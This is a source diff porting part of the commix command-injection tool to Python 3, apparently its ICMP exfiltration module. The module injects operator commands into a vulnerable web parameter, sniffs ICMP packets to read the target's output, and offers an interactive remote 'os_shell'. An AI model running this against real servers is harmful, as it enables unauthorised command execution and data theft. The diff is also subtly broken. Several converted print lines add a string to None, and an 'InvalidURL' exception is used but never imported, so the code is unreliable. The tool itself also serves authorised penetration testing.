@@ -18,21 +18,17 @@ import os
 import sys
 import time
 import signal
-import urllib
-import urllib2
+from src.thirdparty.six.moves import input as _input
+from src.thirdparty.six.moves import urllib as _urllib
 import threading
-
 from src.utils import menu
 from src.utils import logs
 from src.utils import settings
-
 from src.thirdparty.colorama import Fore, Back, Style, init
-
 from src.core.requests import tor
 from src.core.requests import proxy
 from src.core.requests import headers
 from src.core.requests import parameters
-
 from src.core.shells import reverse_tcp
 from src.core.injections.controller import checks
 
@@ -93,7 +89,7 @@ def snif(ip_dst, ip_src):
   success_msg = "Started the sniffer between " + Fore.YELLOW + ip_src
   success_msg += Style.RESET_ALL + Style.BRIGHT + " and " + Fore.YELLOW 
   success_msg += ip_dst + Style.RESET_ALL + Style.BRIGHT + "."
-  print settings.print_success_msg(success_msg)
+  print(settings.print_success_msg(success_msg))
   
   while True:
     sniff(filter = "icmp and src " + ip_dst, prn=packet_handler, timeout=settings.TIMESEC)
@@ -116,29 +112,32 @@ def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
     req = url + data
   else:
     values =  {vuln_parameter:payload}
-    data = urllib.urlencode(values)
-    req = urllib2.Request(url=url, data=data)
+    data = _urllib.parse.urlencode(values)
+    req = _urllib.request.Request(url=url, data=data)
 
   try:
     sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
-    response = urllib2.urlopen(req)
+    response = _urllib.request.urlopen(req)
     time.sleep(3)
     sys.stdout.write(Style.RESET_ALL)
     if add_new_line:
-      print "\n"
+      print("\n")
       add_new_line = True
     else:
-      print ""
+      print("")
       
-  except urllib2.HTTPError, err_msg:
-    print settings.print_critical_msg(str(err_msg.code))
+  except _urllib.error.HTTPError as err_msg:
+    print(settings.print_critical_msg(str(err_msg.code)))
     raise SystemExit()
 
-  except urllib2.URLError, err_msg:
-    print settings.print_critical_msg(str(err_msg.args[0]).split("] ")[1] + ".")
+  except _urllib.error.URLError as err_msg:
+    print(settings.print_critical_msg(str(err_msg.args[0]).split("] ")[1] + "."))
     raise SystemExit()
 
-
+  except InvalidURL:
+    err_msg = "Invalid target URL has been given." 
+    print(settings.print_critical_msg(err_msg))
+    raise SystemExit()
 
 def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
 
@@ -154,7 +153,7 @@ def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
     warn_msg = "The " + err_msg + " options are not supported "
     warn_msg += "by this module because of the structure of the exfiltrated data. "
     warn_msg += "Please try using any unix-like commands manually."
-    print settings.print_warning_msg(warn_msg)
+    print(settings.print_warning_msg(warn_msg))
 
   # Pseudo-Terminal shell
   go_back = False
@@ -164,14 +163,13 @@ def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
       break
     if not menu.options.batch:  
       question_msg = "Do you want a Pseudo-Terminal shell? [Y/n] > "
-      sys.stdout.write(settings.print_question_msg(question_msg))
-      gotshell = sys.stdin.readline().replace("\n","").lower()
+      gotshell = _input(settings.print_question_msg(question_msg))
     else:
       gotshell = ""  
     if len(gotshell) == 0:
        gotshell= "y"
     if gotshell in settings.CHOICE_YES:
-      print "\nPseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
+      print("\nPseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)")
       if readline_error:
         checks.no_readline_module()
       while True:
@@ -185,37 +183,37 @@ def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
             # Unix tab compliter
             else:
               readline.parse_and_bind("tab: complete")
-          cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
+          cmd = _input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
           cmd = checks.escaped_cmd(cmd)
           if cmd.lower() in settings.SHELL_OPTIONS:
             if cmd.lower() == "quit" or cmd.lower() == "back":       
-              print ""             
+              print("")             
               os._exit(0)
             elif cmd.lower() == "?": 
               menu.os_shell_options()
             elif cmd.lower() == "os_shell": 
               warn_msg = "You are already into the '" + cmd.lower() + "' mode."
-              print settings.print_warning_msg(warn_msg)+ "\n"
+              print(settings.print_warning_msg(warn_msg))+ "\n"
             elif cmd.lower() == "reverse_tcp":
               warn_msg = "This option is not supported by this module."
-              print settings.print_warning_msg(warn_msg)+ "\n"
+              print(settings.print_warning_msg(warn_msg))+ "\n"
           else:
             # Command execution results.
             cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src)
         except KeyboardInterrupt:
           os._exit(1)
         except:
-          print ""
+          print("")
           os._exit(0)
     elif gotshell in settings.CHOICE_NO:
-      print ""
+      print("")
       os._exit(0)
     elif gotshell in settings.CHOICE_QUIT:
-      print ""
+      print("")
       os._exit(0)
     else:
       err_msg = "'" + gotshell + "' is not a valid answer."
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       pass
 
 
@@ -229,7 +227,7 @@ def exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter, techn
   if menu.options.os_cmd:
     cmd = menu.options.os_cmd
     cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src)
-    print ""
+    print("")
     os._exit(0)
   else:
     input_cmd(http_request_method, url, vuln_parameter, ip_src, technique)
@@ -241,20 +239,20 @@ def icmp_exfiltration_handler(url, http_request_method):
   # You need to have root privileges to run this script
   if os.geteuid() != 0:
     err_msg = "You need to have root privileges to run this option."
-    print settings.print_critical_msg(err_msg) + "\n"
+    print(settings.print_critical_msg(err_msg) + "\n")
     os._exit(0)
 
   if http_request_method == "GET":
     #url = parameters.do_GET_check(url)
-    request = urllib2.Request(url)
+    request = _urllib.request.Request(url)
     headers.do_check(request)
     vuln_parameter = parameters.vuln_GET_param(url)
     
   else:
     parameter = menu.options.data
-    parameter = urllib2.unquote(parameter)
+    parameter = _urllib.parse.unquote(parameter)
     parameter = parameters.do_POST_check(parameter)
-    request = urllib2.Request(url, parameter)
+    request = _urllib.request.Request(url, parameter)
     headers.do_check(request)
     vuln_parameter = parameters.vuln_POST_param(parameter, url)
   
@@ -262,12 +260,12 @@ def icmp_exfiltration_handler(url, http_request_method):
   if menu.options.proxy:
     try:
       response = proxy.use_proxy(request)
-    except urllib2.HTTPError, err_msg:
+    except _urllib.error.HTTPError as err_msg:
       if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
         response = False  
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
-        print "\n" + settings.print_critical_msg(err)
+        print("\n") + settings.print_critical_msg(err)
         continue_tests = checks.continue_tests(err_msg)
         if continue_tests == True:
           settings.IGNORE_ERR_MSG = True
@@ -278,12 +276,12 @@ def icmp_exfiltration_handler(url, http_request_method):
   elif menu.options.tor:
     try:
       response = tor.use_tor(request)
-    except urllib2.HTTPError, err_msg:
+    except _urllib.error.HTTPError as err_msg:
       if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
         response = False  
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
-        print "\n" + settings.print_critical_msg(err)
+        print("\n") + settings.print_critical_msg(err)
         continue_tests = checks.continue_tests(err_msg)
         if continue_tests == True:
           settings.IGNORE_ERR_MSG = True
@@ -292,13 +290,13 @@ def icmp_exfiltration_handler(url, http_request_method):
 
   else:
     try:
-      response = urllib2.urlopen(request)
-    except urllib2.HTTPError, err_msg:
+      response = _urllib.request.urlopen(request)
+    except _urllib.error.HTTPError as err_msg:
       if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
         response = False  
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
-        print "\n" + settings.print_critical_msg(err)
+        print("\n") + settings.print_critical_msg(err)
         continue_tests = checks.continue_tests(err_msg)
         if continue_tests == True:
           settings.IGNORE_ERR_MSG = True
@@ -308,7 +306,7 @@ def icmp_exfiltration_handler(url, http_request_method):
   if settings.TARGET_OS == "win":
     err_msg = "This module's payloads are not suppoted by "
     err_msg += "the identified target operating system."
-    print settings.print_critical_msg(err_msg) + "\n"
+    print(settings.print_critical_msg(err_msg) + "\n")
     os._exit(0)
 
   else:
